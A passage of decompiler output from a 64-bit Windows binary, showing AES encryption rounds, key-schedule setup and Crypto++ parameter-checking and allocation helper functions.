  v41 = v55[7];
  v55 += 8;
  v61 = sub_13F12BD30();
  v60 = 0;
  v56 = 0;
  for ( i = 0; i < 0x800; i += v61 )
    v56 &= *(_DWORD *)((char *)qword_13F1C45D0 + i);
  v56 &= LODWORD(qword_13F1C45D0[255]);
  v54 |= v56;
  v53 |= v56;
  v52 |= v56;
  v51 |= v56;
  v42 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v51]) ^ v41;
  v51 >>= 8;
  v12 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v51] + 1) ^ v11;
  v51 >>= 8;
  v22 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v51] + 2) ^ v21;
  v51 >>= 8;
  v32 = *(_DWORD *)((char *)&qword_13F1C45D0[v51] + 3) ^ v31;
  v13 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v52]) ^ v12;
  v52 >>= 8;
  v23 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v52] + 1) ^ v22;
  v52 >>= 8;
  v33 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v52] + 2) ^ v32;
  v52 >>= 8;
  v43 = *(_DWORD *)((char *)&qword_13F1C45D0[v52] + 3) ^ v42;
  v24 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v53]) ^ v23;
  v53 >>= 8;
  v34 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v53] + 1) ^ v33;
  v53 >>= 8;
  v44 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v53] + 2) ^ v43;
  v53 >>= 8;
  v14 = *(_DWORD *)((char *)&qword_13F1C45D0[v53] + 3) ^ v13;
  v35 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v54]) ^ v34;
  v54 >>= 8;
  v45 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v54] + 1) ^ v44;
  v54 >>= 8;
  v15 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v54] + 2) ^ v14;
  v54 >>= 8;
  v25 = *(_DWORD *)((char *)&qword_13F1C45D0[v54] + 3) ^ v24;
  v59 = *(_DWORD *)(a1 + 16) / 2u - 1;
  do
  {
    v54 = *v55;
    v53 = v55[1];
    v52 = v55[2];
    v51 = v55[3];
    v54 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v45] + 3);
    v46 = v45 >> 8;
    v53 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v46] + 2);
    v46 >>= 8;
    v52 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v46] + 1);
    v51 ^= HIDWORD(qword_13F1C45D0[v46 >> 8]);
    v51 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v15] + 3);
    v16 = v15 >> 8;
    v54 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v16] + 2);
    v16 >>= 8;
    v53 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v16] + 1);
    v52 ^= HIDWORD(qword_13F1C45D0[v16 >> 8]);
    v52 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v25] + 3);
    v26 = v25 >> 8;
    v51 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v26] + 2);
    v26 >>= 8;
    v54 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v26] + 1);
    v53 ^= HIDWORD(qword_13F1C45D0[v26 >> 8]);
    v53 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v35] + 3);
    v36 = v35 >> 8;
    v52 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v36] + 2);
    v36 >>= 8;
    v51 ^= *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v36] + 1);
    v54 ^= HIDWORD(qword_13F1C45D0[v36 >> 8]);
    v27 = v55[5];
    v17 = v55[6];
    v47 = v55[7];
    v37 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v51] + 3) ^ v55[4];
    v51 >>= 8;
    v28 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v51] + 2) ^ v27;
    v51 >>= 8;
    v18 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v51] + 1) ^ v17;
    v51 >>= 8;
    v48 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v52] + 3) ^ HIDWORD(qword_13F1C45D0[v51]) ^ v47;
    v52 >>= 8;
    v38 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v52] + 2) ^ v37;
    v52 >>= 8;
    v29 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v52] + 1) ^ v28;
    v52 >>= 8;
    v19 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v53] + 3) ^ HIDWORD(qword_13F1C45D0[v52]) ^ v18;
    v53 >>= 8;
    v49 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v53] + 2) ^ v48;
    v53 >>= 8;
    v39 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v53] + 1) ^ v38;
    v53 >>= 8;
    v25 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v54] + 3) ^ HIDWORD(qword_13F1C45D0[v53]) ^ v29;
    v54 >>= 8;
    v15 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v54] + 2) ^ v19;
    v54 >>= 8;
    v45 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v54] + 1) ^ v49;
    v54 >>= 8;
    v35 = HIDWORD(qword_13F1C45D0[v54]) ^ v39;
    v55 += 8;
    --v59;
  }
  while ( v59 );
  v57 = &v67;
  HIBYTE(v70) = BYTE1(qword_13F1C45D0[(unsigned __int8)v15]);
  v20 = v15 >> 8;
  BYTE2(v67) = BYTE1(qword_13F1C45D0[(unsigned __int8)v20]);
  v20 >>= 8;
  BYTE1(v68) = BYTE1(qword_13F1C45D0[(unsigned __int8)v20]);
  LOBYTE(v69) = BYTE1(qword_13F1C45D0[v20 >> 8]);
  HIBYTE(v69) = BYTE1(qword_13F1C45D0[(unsigned __int8)v25]);
  v30 = v25 >> 8;
  BYTE2(v70) = BYTE1(qword_13F1C45D0[(unsigned __int8)v30]);
  v30 >>= 8;
  BYTE1(v67) = BYTE1(qword_13F1C45D0[(unsigned __int8)v30]);
  LOBYTE(v68) = BYTE1(qword_13F1C45D0[v30 >> 8]);
  HIBYTE(v68) = BYTE1(qword_13F1C45D0[(unsigned __int8)v35]);
  v40 = v35 >> 8;
  BYTE2(v69) = BYTE1(qword_13F1C45D0[(unsigned __int8)v40]);
  v40 >>= 8;
  BYTE1(v70) = BYTE1(qword_13F1C45D0[(unsigned __int8)v40]);
  LOBYTE(v67) = BYTE1(qword_13F1C45D0[v40 >> 8]);
  HIBYTE(v67) = BYTE1(qword_13F1C45D0[(unsigned __int8)v45]);
  v50 = v45 >> 8;
  BYTE2(v68) = BYTE1(qword_13F1C45D0[(unsigned __int8)v50]);
  v50 >>= 8;
  BYTE1(v69) = BYTE1(qword_13F1C45D0[(unsigned __int8)v50]);
  LOBYTE(v70) = BYTE1(qword_13F1C45D0[v50 >> 8]);
  v66[0] = a3;
  v66[1] = a4;
  v64 = v55[3] ^ v70;
  v63 = v55[2] ^ v69;
  v62 = v55[1] ^ v68;
  v8 = sub_13F12ADAC(v66, *v55 ^ v67);
  v9 = sub_13F12ADAC(v8, v62);
  v10 = sub_13F12ADAC(v9, v63);
  return sub_13F12ADAC(v10, v64);
}
// 13F1C45D0: using guessed type __int64 qword_13F1C45D0[256];

//----- (000000013F12CDE4) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F12CDE4(__int64 a1, const __m128i *a2, unsigned int a3)
{
  unsigned __int64 result; // rax
  __m128i *v4; // [rsp+30h] [rbp-128h]
  __m128i *v5; // [rsp+30h] [rbp-128h]
  unsigned int v6; // [rsp+38h] [rbp-120h]
  __int32 v7; // [rsp+3Ch] [rbp-11Ch]
  __int32 v8; // [rsp+3Ch] [rbp-11Ch]
  int v9; // [rsp+3Ch] [rbp-11Ch]
  int v10; // [rsp+3Ch] [rbp-11Ch]
  int v11; // [rsp+3Ch] [rbp-11Ch]
  int v12; // [rsp+3Ch] [rbp-11Ch]
  unsigned int i; // [rsp+40h] [rbp-118h]
  unsigned int v14; // [rsp+48h] [rbp-110h]
  __int32 v15; // [rsp+50h] [rbp-108h]
  unsigned int v16; // [rsp+58h] [rbp-100h]
  __int32 v17; // [rsp+60h] [rbp-F8h]
  unsigned int v18; // [rsp+68h] [rbp-F0h]
  __int32 v19; // [rsp+70h] [rbp-E8h]
  unsigned int v20; // [rsp+78h] [rbp-E0h]
  __int32 v21; // [rsp+80h] [rbp-D8h]
  unsigned int v22; // [rsp+88h] [rbp-D0h]
  __int32 v23; // [rsp+90h] [rbp-C8h]
  unsigned int v24; // [rsp+98h] [rbp-C0h]
  __int32 v25; // [rsp+A0h] [rbp-B8h]
  unsigned int v26; // [rsp+A8h] [rbp-B0h]
  __int32 v27; // [rsp+B0h] [rbp-A8h]
  unsigned int v28; // [rsp+B8h] [rbp-A0h]
  __int32 v29; // [rsp+C0h] [rbp-98h]
  __int64 *v30; // [rsp+D8h] [rbp-80h]
  __int64 v31; // [rsp+E0h] [rbp-78h]
  const __m128i *v32; // [rsp+F0h] [rbp-68h]
  unsigned __int64 v33; // [rsp+F8h] [rbp-60h]
  __m128i *v34; // [rsp+100h] [rbp-58h]

  sub_13F1051C0((_QWORD *)(a1 + 64), 4664i64);
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_DWORD *)(a1 + 24) = a3 / 4 + 6;
  sub_13F12BDB8(a1 + 32, (unsigned int)(4 * *(_DWORD *)(a1 + 24) + 4));
  v4 = *(__m128i **)(a1 + 56);
  if ( (unsigned __int8)sub_13F12BD50() && (unsigned __int8)sub_13F12BD90() )
  {
    sub_13F13F770(a2, a3, v4);
    result = (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 8) + 64i64))(a1 + 8);
    if ( !(_BYTE)result )
      return sub_13F13F700(*(__m128i **)(a1 + 56), *(_DWORD *)(a1 + 24));
  }
  else
  {
    sub_13F12AEF8(1, v4, a3 / 4, a2, a3);
    v30 = qword_13F189470;
    while ( 1 )
    {
      v7 = v4->m128i_i32[a3 / 4 - 1];
      v4->m128i_i32[a3 / 4] = *(_DWORD *)v30 ^ *((unsigned __int8 *)qword_13F189270 + HIBYTE(v7)) ^ (*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)v7) << 8) ^ (*((unsigned __int8 *)qword_13F189270 + BYTE1(v7)) << 16) ^ (*((unsigned __int8 *)qword_13F189270 + BYTE2(v7)) << 24) ^ v4->m128i_i32[0];
      v30 = (__int64 *)((char *)v30 + 4);
      v4->m128i_i32[a3 / 4 + 1] = v4->m128i_i32[a3 / 4] ^ v4->m128i_i32[1];
      v4->m128i_i32[a3 / 4 + 2] = v4->m128i_i32[a3 / 4 + 1] ^ v4->m128i_i32[2];
      v4->m128i_i32[a3 / 4 + 3] = v4->m128i_i32[a3 / 4 + 2] ^ v4->m128i_i32[3];
      if ( (__m128i *)((char *)&v4[1] + 4 * (a3 / 4)) == (__m128i *)(*(_QWORD *)(a1 + 56) + 4i64 * *(_QWORD *)(a1 + 48)) )
        break;
      if ( a3 == 24 )
      {
        v4[2].m128i_i32[2] = v4[2].m128i_i32[1] ^ v4[1].m128i_i32[0];
        v4[2].m128i_i32[3] = v4[2].m128i_i32[2] ^ v4[1].m128i_i32[1];
      }
      else if ( a3 == 32 )
      {
        v8 = v4[2].m128i_i32[3];
        v4[3].m128i_i32[0] = *((unsigned __int8 *)qword_13F189270 + (unsigned __int8)v8) ^ (*((unsigned __int8 *)qword_13F189270
                                                                                            + BYTE1(v8)) << 8) ^ (*((unsigned __int8 *)qword_13F189270 + BYTE2(v8)) << 16) ^ (*((unsigned __int8 *)qword_13F189270 + HIBYTE(v8)) << 24) ^ v4[1].m128i_i32[0];
        v4[3].m128i_i32[1] = v4[3].m128i_i32[0] ^ v4[1].m128i_i32[1];
        v4[3].m128i_i32[2] = v4[3].m128i_i32[1] ^ v4[1].m128i_i32[2];
        v4[3].m128i_i32[3] = v4[3].m128i_i32[2] ^ v4[1].m128i_i32[3];
      }
      v4 = (__m128i *)((char *)v4 + 4 * (a3 / 4));
    }
    v5 = *(__m128i **)(a1 + 56);
    if ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 8) + 64i64))(a1 + 8) )
    {
      sub_13F12BC34();
      if ( !sub_13F12BDB0(1) )
        sub_13F12AE84((__int64)v5, (__int64)v5, 0x10ui64);
      v31 = (__int64)v5->m128i_i64 + 4 * (unsigned int)(4 * *(_DWORD *)(a1 + 24));
      if ( !sub_13F12BDB0(1) )
        sub_13F12AE84(v31, v31, 0x10ui64);
    }
    else
    {
      sub_13F12BA08();
      v6 = 4;
      for ( i = 4 * *(_DWORD *)(a1 + 24) - 4; v6 < i; i -= 4 )
      {
        v9 = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                  + (unsigned __int8)v5[v6 / 4].m128i_i32[0])]
                       + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                   + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[0]))]
                                        + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                    + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[0]))]
                                                         + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                        + HIBYTE(v5[v6 / 4].m128i_i32[0]))]);
        v5[v6 / 4].m128i_i32[0] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                       + (unsigned __int8)v5->m128i_i32[i])]
                                            + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                        + (unsigned __int8)BYTE1(v5->m128i_i32[i]))]
                                                             + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5->m128i_i32[i]))]
                                                                              + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5->m128i_i32[i]))]);
        v5->m128i_i32[i] = v9;
        v10 = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                   + (unsigned __int8)v5[v6 / 4].m128i_i32[1])]
                        + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                    + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[1]))]
                                         + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                     + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[1]))]
                                                          + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                         + HIBYTE(v5[v6 / 4].m128i_i32[1]))]);
        v5[v6 / 4].m128i_i32[1] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                       + (unsigned __int8)v5->m128i_i32[i + 1])]
                                            + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                        + (unsigned __int8)BYTE1(v5->m128i_i32[i + 1]))]
                                                             + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5->m128i_i32[i + 1]))]
                                                                              + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5->m128i_i32[i + 1]))]);
        v5->m128i_i32[i + 1] = v10;
        v11 = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                   + (unsigned __int8)v5[v6 / 4].m128i_i32[2])]
                        + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                    + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[2]))]
                                         + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                     + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[2]))]
                                                          + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                         + HIBYTE(v5[v6 / 4].m128i_i32[2]))]);
        v5[v6 / 4].m128i_i32[2] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                       + (unsigned __int8)v5->m128i_i32[i + 2])]
                                            + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                        + (unsigned __int8)BYTE1(v5->m128i_i32[i + 2]))]
                                                             + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5->m128i_i32[i + 2]))]
                                                                              + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5->m128i_i32[i + 2]))]);
        v5->m128i_i32[i + 2] = v11;
        v12 = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                   + (unsigned __int8)v5[v6 / 4].m128i_i32[3])]
                        + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                    + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[3]))]
                                         + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                     + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[3]))]
                                                          + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                         + HIBYTE(v5[v6 / 4].m128i_i32[3]))]);
        v5[v6 / 4].m128i_i32[3] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                       + (unsigned __int8)v5->m128i_i32[i + 3])]
                                            + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                        + (unsigned __int8)BYTE1(v5->m128i_i32[i + 3]))]
                                                             + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5->m128i_i32[i + 3]))]
                                                                              + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5->m128i_i32[i + 3]))]);
        v5->m128i_i32[i + 3] = v12;
        v6 += 4;
      }
      v5[v6 / 4].m128i_i32[0] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                     + (unsigned __int8)v5[v6 / 4].m128i_i32[0])]
                                          + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                      + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[0]))]
                                                           + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[0]))]
                                                                            + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5[v6 / 4].m128i_i32[0]))]);
      v5[v6 / 4].m128i_i32[1] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                     + (unsigned __int8)v5[v6 / 4].m128i_i32[1])]
                                          + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                      + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[1]))]
                                                           + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[1]))]
                                                                            + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5[v6 / 4].m128i_i32[1]))]);
      v5[v6 / 4].m128i_i32[2] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                     + (unsigned __int8)v5[v6 / 4].m128i_i32[2])]
                                          + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                      + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[2]))]
                                                           + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[2]))]
                                                                            + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5[v6 / 4].m128i_i32[2]))]);
      v5[v6 / 4].m128i_i32[3] = *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                     + (unsigned __int8)v5[v6 / 4].m128i_i32[3])]
                                          + 3) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270
                                                                                      + (unsigned __int8)BYTE1(v5[v6 / 4].m128i_i32[3]))]
                                                           + 2) ^ *(_DWORD *)((char *)&qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + (unsigned __int8)BYTE2(v5[v6 / 4].m128i_i32[3]))]
                                                                            + 1) ^ HIDWORD(qword_13F1C4DE0[*((unsigned __int8 *)qword_13F189270 + HIBYTE(v5[v6 / 4].m128i_i32[3]))]);
      v14 = v5->m128i_i32[0];
      if ( sub_13F12BDB0(1) )
        v15 = v14;
      else
        v15 = sub_13F12BA00(v14);
      v16 = v5->m128i_u32[4 * *(_DWORD *)(a1 + 24)];
      if ( sub_13F12BDB0(1) )
        v17 = v16;
      else
        v17 = sub_13F12BA00(v16);
      v5->m128i_i32[0] = v17;
      v5->m128i_i32[4 * *(_DWORD *)(a1 + 24)] = v15;
      v18 = v5->m128i_u32[1];
      if ( sub_13F12BDB0(1) )
        v19 = v18;
      else
        v19 = sub_13F12BA00(v18);
      v20 = v5->m128i_u32[4 * *(_DWORD *)(a1 + 24) + 1];
      if ( sub_13F12BDB0(1) )
        v21 = v20;
      else
        v21 = sub_13F12BA00(v20);
      v5->m128i_i32[1] = v21;
      v5->m128i_i32[4 * *(_DWORD *)(a1 + 24) + 1] = v19;
      v22 = v5->m128i_u32[2];
      if ( sub_13F12BDB0(1) )
        v23 = v22;
      else
        v23 = sub_13F12BA00(v22);
      v24 = v5->m128i_u32[4 * *(_DWORD *)(a1 + 24) + 2];
      if ( sub_13F12BDB0(1) )
        v25 = v24;
      else
        v25 = sub_13F12BA00(v24);
      v5->m128i_i32[2] = v25;
      v5->m128i_i32[4 * *(_DWORD *)(a1 + 24) + 2] = v23;
      v26 = v5->m128i_u32[3];
      if ( sub_13F12BDB0(1) )
        v27 = v26;
      else
        v27 = sub_13F12BA00(v26);
      v28 = v5->m128i_u32[4 * *(_DWORD *)(a1 + 24) + 3];
      if ( sub_13F12BDB0(1) )
        v29 = v28;
      else
        v29 = sub_13F12BA00(v28);
      v5->m128i_i32[3] = v29;
      v5->m128i_i32[4 * *(_DWORD *)(a1 + 24) + 3] = v27;
    }
    result = (unsigned __int8)sub_13F12BD50();
    if ( (_BYTE)result )
    {
      v33 = (unsigned int)(16 * (*(_DWORD *)(a1 + 24) - 1));
      v32 = v5 + 1;
      v34 = v5 + 1;
      if ( sub_13F12BDB0(1) )
      {
        result = (unsigned __int64)&v5[1];
        if ( v32 != v34 )
          return sub_13F10D330(v34, v33, v32, v33);
      }
      else
      {
        return sub_13F12AE84((__int64)v34, (__int64)v32, v33);
      }
    }
  }
  return result;
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();
// 13F189270: using guessed type __int64 qword_13F189270[32];
// 13F189470: using guessed type __int64 qword_13F189470[8];
// 13F1C4DE0: using guessed type __int64 qword_13F1C4DE0[256];
// 13F1C55E0: using guessed type char byte_13F1C55E0;
// 13F1C55E1: using guessed type char byte_13F1C55E1;

//----- (000000013F12E420) ----------------------------------------------------
__int64 sub_13F12E420()
{
  return -1i64;
}

//----- (000000013F12E430) ----------------------------------------------------
__int64 __fastcall sub_13F12E430(__int64 a1, unsigned __int8 a2, unsigned __int64 a3)
{
  sub_13F15EF70(a1, a2, a3);
  return a1;
}

//----- (000000013F12E450) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F12E450(unsigned __int64 a1)
{
  unsigned __int64 result; // rax
  __int64 v3; // rax
  void (*v4)(void); // rbx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  for ( result = sub_13F16A2BC(a1, 0x10ui64); !result; result = sub_13F16A2BC(a1, 0x10ui64) )
  {
    v3 = sub_13F1783AC(0i64);
    v4 = (void (*)(void))v3;
    if ( !v3 )
    {
      sub_13F109748(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    sub_13F1783AC(v3);
    v4();
  }
  return result;
}
// 13F12E450: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F12E4D0) ----------------------------------------------------
__int64 __fastcall sub_13F12E4D0(__int64 a1)
{
  __int64 result; // rax

  if ( a1 )
    return sub_13F16A2A0(a1);
  return result;
}

//----- (000000013F12E4E0) ----------------------------------------------------
__int64 __fastcall sub_13F12E4E0(__int64 a1)
{
  __int64 result; // rax
  __int64 v3; // rax
  void (*v4)(void); // rbx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  for ( result = sub_13F16A298(a1); !result; result = sub_13F16A298(a1) )
  {
    v3 = sub_13F1783AC(0i64);
    v4 = (void (*)(void))v3;
    if ( !v3 )
    {
      sub_13F109748(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    sub_13F1783AC(v3);
    v4();
  }
  return result;
}
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);
// 13F12E4E0: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F12E560) ----------------------------------------------------
__int64 __fastcall sub_13F12E560(__int64 a1, const __m128i *a2, const __m128i *a3)
{
  __int64 result; // rax
  __m128i *v6; // rax
  __m128i *v7; // rax
  __m128i *v8; // rax
  __m128i *v9; // rax
  __m128i v10[2]; // [rsp+28h] [rbp-F0h] BYREF
  __m128i v11[2]; // [rsp+48h] [rbp-D0h] BYREF
  __m128i v12[2]; // [rsp+68h] [rbp-B0h] BYREF
  __m128i v13[2]; // [rsp+88h] [rbp-90h] BYREF
  char pExceptionObject[64]; // [rsp+B0h] [rbp-68h] BYREF

  result = (*(__int64 (__fastcall **)(__int64, const __m128i *, int *))(*(_QWORD *)a1 + 8i64))(
             a1,
             a3,
             &int `RTTI Type Descriptor');
  if ( !(_BYTE)result )
  {
    v6 = sub_13F1053B0(v10, a2);
    v7 = sub_13F107420(v11, v6, (const __m128i *)": missing required parameter '");
    v8 = sub_13F107420(v12, v7, a3);
    v9 = sub_13F107420(v13, v8, (const __m128i *)&qword_13F19B5B0);
    sub_13F101600((__int64)pExceptionObject, v9);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';
// 13F12E560: using guessed type __m128i var_F0[2];
// 13F12E560: using guessed type __m128i var_D0[2];
// 13F12E560: using guessed type __m128i var_B0[2];
// 13F12E560: using guessed type __m128i var_90[2];

//----- (000000013F12E630) ----------------------------------------------------
void __fastcall sub_13F12E630(__int64 a1, __int64 a2)
{
  int v4; // edx
  int i; // eax
  int v6; // eax
  __m128i *v7; // rax
  __m128i *v8; // rax
  __m128i *v9; // rax
  __m128i *v10; // rax
  __m128i v11[2]; // [rsp+28h] [rbp-E0h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-B8h] BYREF
  __m128i v13[2]; // [rsp+90h] [rbp-78h] BYREF
  __m128i v14[2]; // [rsp+B0h] [rbp-58h] BYREF
  __m128i v15[2]; // [rsp+D0h] [rbp-38h] BYREF

  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, const int **, __int64, __int64))(*(_QWORD *)a2 + 8i64))(
          a2,
          "DecodingLookupArray",
          &int const * `RTTI Type Descriptor',
          a1 + 48,
          -2i64) )
  {
    v7 = sub_13F1053B0(v11, (const __m128i *)"BaseN_Decoder");
    v8 = sub_13F107420(v13, v7, (const __m128i *)": missing required parameter '");
    v9 = sub_13F107420(v14, v8, (const __m128i *)"DecodingLookupArray");
    v10 = sub_13F107420(v15, v9, (const __m128i *)&qword_13F19B5B0);
    sub_13F101600((__int64)pExceptionObject, v10);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_13F12E560(a2, (const __m128i *)"BaseN_Decoder", (const __m128i *)"Log2Base");
  v4 = *(_DWORD *)(a1 + 56);
